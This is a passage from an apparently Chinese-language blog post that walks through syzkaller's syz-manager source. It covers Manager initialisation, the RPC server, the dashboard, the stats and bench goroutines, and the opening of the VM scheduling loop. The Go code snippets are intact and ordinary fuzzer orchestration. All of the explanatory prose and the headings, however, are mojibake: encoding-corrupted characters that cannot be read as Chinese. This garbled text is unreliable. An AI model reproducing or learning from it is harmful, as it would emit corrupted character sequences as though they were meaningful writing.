class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">pipe2(&amp;(0x7f0000000000)=&#123;&lt;r0=&gt;0x0, &lt;r1=&gt;0x0&#125;, 0x0)<br>close(r0)<br>close(r1)<br></code></pre></td></tr></table></figure></blockquote></li><li><p><code>initStats()</code>ï¼šæ³¨å†Œä¸€ä¸ª prometheus ç›‘è§†å™¨ï¼ˆä¸€ä¸ªå¼€æºçš„ç›‘è§†&amp;é¢„è­¦å·¥å…·åŒ…ï¼‰</p></li><li><p><code>initHTTP()</code>ï¼šåˆ›å»ºä¸€ä¸ª HTTP æœåŠ¡å™¨å¹¶æ³¨å†Œä¸€ç³»åˆ—çš„ç›®å½•ï¼ˆç”¨ä»¥ä¾›ä½¿ç”¨è€…è®¿é—®ï¼‰</p></li><li><p><code>collectUsedFiles()</code>ï¼šæ£€æŸ¥æ‰€éœ€æ–‡ä»¶æ˜¯å¦å­˜åœ¨</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go">mgr := &amp;Manager&#123;<br>cfg:              cfg,<br>vmPool:           vmPool,<br>target:           cfg.Target,<br>sysTarget:        cfg.SysTarget,<br>reporter:         reporter,<br>crashdir:         crashdir,<br>startTime:        time.Now(),<br>stats:            &amp;Stats&#123;haveHub: cfg.HubClient != <span class="hljs-string">&quot;&quot;</span>&#125;,<br>crashTypes:       <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>corpus:           <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]CorpusItem),<br>disabledHashes:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>memoryLeakFrames: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>dataRaceFrames:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>fresh:            <span class="hljs-literal">true</span>,<br>vmStop:           <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>),<br>hubReproQueue:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *Crash, <span class="hljs-number">10</span>),<br>needMoreRepros:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>),<br>reproRequest:     <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>usedFiles:        <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]time.Time),<br>saturatedCalls:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>&#125;<br><br>mgr.preloadCorpus()<br>mgr.initStats() <span class="hljs-comment">// åˆå§‹åŒ– prometheus å˜é‡.</span><br>mgr.initHTTP()  <span class="hljs-comment">// åˆ›å»º HTTP æœåŠ¡.</span><br>mgr.collectUsedFiles()<br></code></pre></td></tr></table></figure><p>ä¹‹ååˆ›å»ºä¸€ä¸ª RPC Serverï¼Œç”¨ä»¥åœ¨ Host ä¸ Guest VMs ä¹‹é—´è¿›è¡Œé€šä¿¡ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Create ä¸º fuzzer åˆ›å»º PRC æœåŠ¡å™¨.</span><br>mgr.serv, err = startRPCServer(mgr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create rpc server: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-3-åˆå§‹åŒ–-dashboard-ç›¸å…³"><a href="#Step-3-åˆå§‹åŒ–-dashboard-ç›¸å…³" class="headerlink" title="Step 3.  åˆå§‹åŒ– dashboard ç›¸å…³"></a><em>Step 3.  åˆå§‹åŒ– dashboard ç›¸å…³</em></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> cfg.DashboardAddr != <span class="hljs-string">&quot;&quot;</span> &#123;<br>mgr.dash, err = dashapi.New(cfg.DashboardClient, cfg.DashboardAddr, cfg.DashboardKey)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create dashapi connection: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> !cfg.AssetStorage.IsEmpty() &#123;<br>mgr.assetStorage, err = asset.StorageFromConfig(cfg.AssetStorage, mgr.dash)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to init asset storage: %v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-4-åˆ›å»ºã€æ—¥å¿—è¾“å‡ºã€‘åç¨‹"><a href="#Step-4-åˆ›å»ºã€æ—¥å¿—è¾“å‡ºã€‘åç¨‹" class="headerlink" title="Step 4. åˆ›å»ºã€æ—¥å¿—è¾“å‡ºã€‘åç¨‹"></a>Step 4. åˆ›å»ºã€æ—¥å¿—è¾“å‡ºã€‘åç¨‹</h3><p>æ¥ä¸‹æ¥ä¼šæ–°èµ·ä¸€ä¸ªåç¨‹è¿›è¡Œæ•°æ®è®°å½•çš„å·¥ä½œï¼Œå†…éƒ¨å…¶å®å°±æ˜¯ä¸€ä¸ª<strong>æ¯ 10s è¿›è¡Œä¸€æ¬¡è¿›åº¦é‡‡é›†å¹¶è¾“å‡ºæ—¥å¿—çš„æ— é™å¾ªç¯</strong>ï¼Œä¸»è¦æ˜¯é‡‡é›†æ‰§è¡Œä¿¡æ¯ã€è¯­æ–™è¦†ç›–ç‡ã€crashes ä¿¡æ¯ç­‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> lastTime := time.Now(); ; &#123;<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br>now := time.Now()<br>diff := now.Sub(lastTime)<br>lastTime = now<br>mgr.mu.Lock()<br><span class="hljs-keyword">if</span> mgr.firstConnect.IsZero() &#123;<br>mgr.mu.Unlock()<br><span class="hljs-keyword">continue</span><br>&#125;<br>mgr.fuzzingTime += diff * time.Duration(atomic.LoadUint32(&amp;mgr.numFuzzing))<br>executed := mgr.stats.execTotal.get()<br>crashes := mgr.stats.crashes.get()<br>corpusCover := mgr.stats.corpusCover.get()<br>corpusSignal := mgr.stats.corpusSignal.get()<br>maxSignal := mgr.stats.maxSignal.get()<br>mgr.mu.Unlock()<br>numReproducing := atomic.LoadUint32(&amp;mgr.numReproducing)<br>numFuzzing := atomic.LoadUint32(&amp;mgr.numFuzzing)<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;VMs %v, executed %v, cover %v, signal %v/%v, crashes %v, repro %v&quot;</span>,<br>numFuzzing, executed, corpusCover, corpusSignal, maxSignal, crashes, numReproducing)<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><h3 id="Step-5-åˆ›å»º-bench-åç¨‹ï¼ˆæ¯éš”ä¸€åˆ†é’Ÿæœ€å°åŒ–è¯­æ–™åº“å¹¶å°†-bench-data-å†™å…¥-bench-æ–‡ä»¶ï¼‰"><a href="#Step-5-åˆ›å»º-bench-åç¨‹ï¼ˆæ¯éš”ä¸€åˆ†é’Ÿæœ€å°åŒ–è¯­æ–™åº“å¹¶å°†-bench-data-å†™å…¥-bench-æ–‡ä»¶ï¼‰" class="headerlink" title="Step 5. åˆ›å»º bench åç¨‹ï¼ˆæ¯éš”ä¸€åˆ†é’Ÿæœ€å°åŒ–è¯­æ–™åº“å¹¶å°† bench data å†™å…¥ bench æ–‡ä»¶ï¼‰"></a>Step 5. åˆ›å»º bench åç¨‹ï¼ˆæ¯éš”ä¸€åˆ†é’Ÿæœ€å°åŒ–è¯­æ–™åº“å¹¶å°† bench data å†™å…¥ bench æ–‡ä»¶ï¼‰</h3><p>è¿™é‡Œä¼šåˆ¤æ–­å‘½ä»¤è¡Œä¼ å…¥å‚æ•°æ˜¯å¦æœ‰ <code>bench=</code>ï¼Œè‹¥æ˜¯åˆ™è°ƒç”¨ <code>initBench()</code>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> *flagBench != <span class="hljs-string">&quot;&quot;</span> &#123;<br>mgr.initBench()<br>&#125;<br></code></pre></td></tr></table></figure><p> è¿™é‡Œçš„ <code>flagBench</code> æ˜¯ä¸€ä¸ªå…¨å±€çš„ flag å˜é‡ï¼Œgolang æä¾›äº†ä¸€ä¸ª <code>flag</code> åŒ…ç”¨ä»¥å¤„ç†å‘½ä»¤è¡Œå‚æ•°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>flagConfig = flag.String(<span class="hljs-string">&quot;config&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;configuration file&quot;</span>)<br>flagDebug  = flag.Bool(<span class="hljs-string">&quot;debug&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;dump all VM output to console&quot;</span>)<br>flagBench  = flag.String(<span class="hljs-string">&quot;bench&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;write execution statistics into this file periodically&quot;</span>)<br>)<br></code></pre></td></tr></table></figure><p><code>initBench()</code> ä¼šå¯åŠ¨ä¸€ä¸ªåç¨‹ï¼Œä¸»è¦å°±æ˜¯ä¸€ä¸ªæ¯éš”ä¸€åˆ†é’Ÿè¿è¡Œä¸€æ¬¡çš„å¾ªç¯ï¼š</p><ul><li>è°ƒç”¨ <code>minimizeCorpus()</code> å°†è¯­æ–™åº“è¿›è¡Œæœ€å°åŒ–</li><li>å‘ <code>bench</code> å‚æ•°æŒ‡å®šçš„æ–‡ä»¶å½“ä¸­å†™å…¥ <code>è¯­æ–™åº“é•¿åº¦ã€å¯åŠ¨æ—¶é—´ã€fuzzing æ—¶é—´\n</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> initBench() &#123;<br>f, err := os.OpenFile(*flagBench, os.O_WRONLY|os.O_CREATE|os.O_EXCL, osutil.DefaultFilePerm)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to open bench file: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> &#123;<br>time.Sleep(time.Minute)<br>vals := mgr.stats.all()<br>mgr.mu.Lock()<br><span class="hljs-keyword">if</span> mgr.firstConnect.IsZero() &#123;<br>mgr.mu.Unlock()<br><span class="hljs-keyword">continue</span><br>&#125;<br>mgr.minimizeCorpus()<br>vals[<span class="hljs-string">&quot;corpus&quot;</span>] = <span class="hljs-type">uint64</span>(<span class="hljs-built_in">len</span>(mgr.corpus))<br>vals[<span class="hljs-string">&quot;uptime&quot;</span>] = <span class="hljs-type">uint64</span>(time.Since(mgr.firstConnect)) / <span class="hljs-number">1e9</span><br>vals[<span class="hljs-string">&quot;fuzzing&quot;</span>] = <span class="hljs-type">uint64</span>(mgr.fuzzingTime) / <span class="hljs-number">1e9</span><br>mgr.mu.Unlock()<br><br>data, err := json.MarshalIndent(vals, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;  &quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to serialize bench data&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> _, err := f.Write(<span class="hljs-built_in">append</span>(data, <span class="hljs-string">&#x27;\n&#x27;</span>)); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to write bench data&quot;</span>)<br>&#125;<br>&#125;<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-6-å¯åŠ¨-dashboard-åç¨‹ï¼Œè¿›å…¥ä¸‹ä¸€é˜¶æ®µ"><a href="#Step-6-å¯åŠ¨-dashboard-åç¨‹ï¼Œè¿›å…¥ä¸‹ä¸€é˜¶æ®µ" class="headerlink" title="Step 6. å¯åŠ¨ dashboard åç¨‹ï¼Œè¿›å…¥ä¸‹ä¸€é˜¶æ®µ"></a>Step 6. å¯åŠ¨ dashboard åç¨‹ï¼Œè¿›å…¥ä¸‹ä¸€é˜¶æ®µ</h3><p>æ¥ä¸‹æ¥ä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„åç¨‹ï¼Œä¸»è¦æ˜¯ <em>æ¯éš”ä¸€åˆ†é’Ÿä¸ŠæŠ¥ä¸€æ¬¡ syz-manager çš„çŠ¶æ€ï¼Œè¿™é‡Œä¸å†å±•å¼€</em> ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> mgr.dash != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">go</span> mgr.dashboardReporter()<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åä¼šç®€å•æ£€æŸ¥ä¸€ä¸‹ VM Pool ï¼Œéšåè°ƒç”¨ <code>vmLoop()</code> è¿›å…¥ä¸‹ä¸€é˜¶æ®µï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">osutil.HandleInterrupts(vm.Shutdown)<br><span class="hljs-keyword">if</span> mgr.vmPool == <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;no VMs started (type=none)&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;you are supposed to start syz-fuzzer manually as:&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;syz-fuzzer -manager=manager.ip:%v [other flags as necessary]&quot;</span>, mgr.serv.port)<br>&lt;-vm.Shutdown<br><span class="hljs-keyword">return</span><br>&#125;<br>mgr.vmLoop()<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x04-vmLoop-ï¼šå¯åŠ¨-fuzzingï¼Œç®¡æ§æ•´ä½“æµç¨‹"><a href="#0x04-vmLoop-ï¼šå¯åŠ¨-fuzzingï¼Œç®¡æ§æ•´ä½“æµç¨‹" class="headerlink" title="0x04. vmLoop()ï¼šå¯åŠ¨ fuzzingï¼Œç®¡æ§æ•´ä½“æµç¨‹"></a>0x04. vmLoop()ï¼šå¯åŠ¨ fuzzingï¼Œç®¡æ§æ•´ä½“æµç¨‹</h1><h2 id="ä¸€ã€VM-åˆ†ç»„ï¼Œåˆå§‹åŒ–èµ„æºæ± ç­‰å˜é‡"><a href="#ä¸€ã€VM-åˆ†ç»„ï¼Œåˆå§‹åŒ–èµ„æºæ± ç­‰å˜é‡" class="headerlink" title="ä¸€ã€VM åˆ†ç»„ï¼Œåˆå§‹åŒ–èµ„æºæ± ç­‰å˜é‡"></a>ä¸€ã€VM åˆ†ç»„ï¼Œåˆå§‹åŒ–èµ„æºæ± ç­‰å˜é‡</h2><p>ä¸€å¼€å§‹é¦–å…ˆä¼šå°†æ‰€æœ‰çš„ VM åˆ†ä¸ºä¸¤ç»„ï¼šä¸€ç»„è´Ÿè´£ fuzzingï¼Œä¸€ç»„è´Ÿè´£å¤ç° crash ï¼ˆ<code>maxReproVMs</code>ï¼‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Manager needs to be refactored (#605).</span><br><span class="hljs-comment">// nolint: gocyclo, gocognit, funlen</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> vmLoop() &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;booting test machines...&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;wait for the connection from test machine...&quot;</span>)<br>instancesPerRepro := <span class="hljs-number">4</span><br>vmCount := mgr.vmPool.Count()<br>maxReproVMs := vmCount - mgr.cfg.FuzzingVMs<br><span class="hljs-keyword">if</span> instancesPerRepro &gt; maxReproVMs &amp;&amp; maxReproVMs &gt; <span class="hljs-number">0</span> &#123;<br>instancesPerRepro = maxReproVMs<br>&#125;<br></code></pre></td></tr></table></figure><p>éšåä¼šè°ƒç”¨ <code>SequentialResourcePool()</code> æ–°å»ºä¸€ä¸ª <code>ResourcePool</code> é˜Ÿåˆ—ï¼Œä¸»è¦è´Ÿè´£å¯¹<strong>ç©ºé—² VM ä½¿ç”¨é¡ºåº</strong>çš„è°ƒæ§ ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">instances := SequentialResourcePool(vmCount, <span class="hljs-number">10</span>*time.Second*mgr.cfg.Timeouts.Scale)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šåˆå§‹åŒ–ä¸€ç³»åˆ—çš„å˜é‡ï¼š</p><ul><li><code>runDone</code>ï¼šä¿å­˜ fuzzing ç»“æœä¸º crash çš„ <strong>Crash é˜Ÿåˆ—</strong></li><li><code>pendingRepro</code>ï¼šæ ‡è¯†<strong>å¾…å¤ç°çš„ Crash</strong></li><li><code>reproducing</code>ï¼šæ ‡è¯†<strong>æŸä¸ªç±»å‹ Crash</strong> æ˜¯å¦å‡†å¤‡è¢«å¤ç°</li><li><code>reproQueue</code>ï¼šCrash çš„å¤ç°é˜Ÿåˆ—</li><li><code>reproDone</code>ï¼šCrash çš„å¤ç°ç»“æœ</li><li><code>stopPending</code>ï¼šç­‰å¾…åœæ­¢æ ‡å¿—ä½</li><li><code>shutdown</code>ï¼šå·¥ä½œç»ˆæ­¢æ ‡å¿—ä½</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">runDone := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *RunResult, <span class="hljs-number">1</span>)<br>pendingRepro := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*Crash]<span class="hljs-type">bool</span>)<br>reproducing := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">var</span> reproQueue []*Crash<br>reproDone := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *ReproResult, <span class="hljs-number">1</span>)<br>stopPending := <span class="hljs-literal">false</span><br>shutdown := vm.Shutdown<br></code></pre></td></tr></table></figure><p>æœ€åè¿›å…¥åˆ°ä¸€ä¸ªå¤§å¾ªç¯ä¸­ï¼Œè¿™ä¸ªå¤§å¾ªç¯æ‰æ˜¯çœŸæ­£çš„ fuzzing è°ƒæ§æµç¨‹</p><h2 id="äºŒã€å¤–å±‚å¤§å¾ªç¯ï¼šè°ƒé…ç©ºé—²-VM-è¿›è¡Œ-fuzz-amp-crash-reproï¼Œç­‰å¾…å¤„ç†ä¸åŒ-channel-æ•°æ®"><a href="#äºŒã€å¤–å±‚å¤§å¾ªç¯ï¼šè°ƒé…ç©ºé—²-VM-è¿›è¡Œ-fuzz-amp-crash-reproï¼Œç­‰å¾…å¤„ç†ä¸åŒ-channel-æ•°æ®" class="headerlink" title="äºŒã€å¤–å±‚å¤§å¾ªç¯ï¼šè°ƒé…ç©ºé—² VM è¿›è¡Œ fuzz &amp; crash reproï¼Œç­‰å¾…å¤„ç†ä¸åŒ channel æ•°æ®"></a>äºŒã€å¤–å±‚å¤§å¾ªç¯ï¼šè°ƒé…ç©ºé—² VM è¿›è¡Œ fuzz &amp; crash reproï¼Œç­‰å¾…å¤„ç†ä¸åŒ channel æ•°æ®</h2><p>å¤§å¾ªç¯çš„ç»ˆæ­¢æ¡ä»¶ä¸º <code>shutdown == nil</code> æˆ–æ˜¯ ResourcePool ä¸­çš„ VM æ•°é‡ä¸æ€»æ•°é‡ä¸ç›¸ç­‰ï¼Œè¿›å…¥å¾ªç¯åé¦–å…ˆä¼šè·å–å½“å‰æ‰€åœ¨é˜¶æ®µï¼š </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> shutdown != <span class="hljs-literal">nil</span> || instances.Len() != vmCount &#123;<br>mgr.mu.Lock()<br>phase := mgr.phase<br>mgr.mu.Unlock()<br></code></pre></td></tr></table></figure><h3 id="Step-1-å†…å±‚å°å¾ªç¯ï¼šè·å–å¾…å¤ç°-crash-åŠ å…¥å¤ç°é˜Ÿåˆ—"><a href="#Step-1-å†…å±‚å°å¾ªç¯ï¼šè·å–å¾…å¤ç°-crash-åŠ å…¥å¤ç°é˜Ÿåˆ—" class="headerlink" title="Step 1. å†…å±‚å°å¾ªç¯ï¼šè·å–å¾…å¤ç° crash åŠ å…¥å¤ç°é˜Ÿåˆ—"></a>Step 1. å†…å±‚å°å¾ªç¯ï¼šè·å–å¾…å¤ç° crash åŠ å…¥å¤ç°é˜Ÿåˆ—</h3><p>å°å¾ªç¯ä¼šéå† <code>pendingRepro</code> ä¸­çš„ crashï¼š</p><ul><li>è‹¥æœªè¢«å¤ç°åˆ™ä» pendingRepro ä¸­åˆ é™¤</li><li>è°ƒç”¨ <code>needRepro()</code> æ£€æŸ¥æ˜¯å¦éœ€è¦å¤ç°</li><li>æ ‡è®°è¯¥æ ‡é¢˜çš„ crash å·²åœ¨å¤ç°ï¼Œå¹¶åŠ å…¥å¤ç°é˜Ÿåˆ—ä¸­</li></ul><p>è¿™é‡Œçš„ <code>crash.Title</code> å…¶å®æ˜¯ <strong>Oops çš„ç¬¬ä¸€è¡Œæ–‡æœ¬ï¼Œ</strong>å³<strong>åŒä¸€æ—¶åˆ»ä»…ä¼šå¤ç°åŒç±» crash ä¸­çš„ä¸€ä¸ª</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> crash := <span class="hljs-keyword">range</span> pendingRepro &#123;<br><span class="hljs-keyword">if</span> reproducing[crash.Title] &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-built_in">delete</span>(pendingRepro, crash)<br><span class="hljs-keyword">if</span> !mgr.needRepro(crash) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: add to repro queue &#x27;%v&#x27;&quot;</span>, crash.Title)<br>reproducing[crash.Title] = <span class="hljs-literal">true</span><br>reproQueue = <span class="hljs-built_in">append</span>(reproQueue, crash)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-åˆ¤æ–­æ˜¯å¦å¯ä»¥å¯¹-crash-è¿›è¡Œå¤ç°å¹¶è°ƒæ§-VM"><a href="#Step-2-åˆ¤æ–­æ˜¯å¦å¯ä»¥å¯¹-crash-è¿›è¡Œå¤ç°å¹¶è°ƒæ§-VM" class="headerlink" title="Step 2. åˆ¤æ–­æ˜¯å¦å¯ä»¥å¯¹ crash è¿›è¡Œå¤ç°å¹¶è°ƒæ§ VM"></a>Step 2. åˆ¤æ–­æ˜¯å¦å¯ä»¥å¯¹ crash è¿›è¡Œå¤ç°å¹¶è°ƒæ§ VM</h3><p>æ¥ä¸‹æ¥ä¼šè¾“å‡ºä¸€è¡Œæ—¥å¿—ï¼Œä¹‹åå®šä¹‰ä¸€ä¸ªé—­åŒ…å‡½æ•° <code>canRepro</code>ï¼Œç”¨æ¥åˆ¤æ–­<strong>å½“å‰æ˜¯å¦å¯ä»¥è¿›è¡Œ crash å¤ç°</strong>ï¼Œä¸»è¦åˆ¤æ–­ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶æ˜¯å¦æ»¡è¶³ï¼š</p><ul><li>å½“å‰é˜¶æ®µæ˜¯å¦è¶…è¿‡ <code>phaseTriagedHub</code> </li><li>å¾…å¤ç°é˜Ÿåˆ— <code>reproQueue</code> æ˜¯å¦ä¸ä¸ºç©º</li><li>åŠ ä¸Šè¯¥ crash åæ‰€æœ‰ç”¨æ¥å¤ç° crash çš„ VM æ•°é‡æ˜¯å¦å°äº <code>maxReproVMs</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: phase=%v shutdown=%v instances=%v/%v %+v repro: pending=%v reproducing=%v queued=%v&quot;</span>,<br>phase, shutdown == <span class="hljs-literal">nil</span>, instances.Len(), vmCount, instances.Snapshot(),<br><span class="hljs-built_in">len</span>(pendingRepro), <span class="hljs-built_in">len</span>(reproducing), <span class="hljs-built_in">len</span>(reproQueue))<br><br>canRepro := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> phase &gt;= phaseTriagedHub &amp;&amp; <span class="hljs-built_in">len</span>(reproQueue) != <span class="hljs-number">0</span> 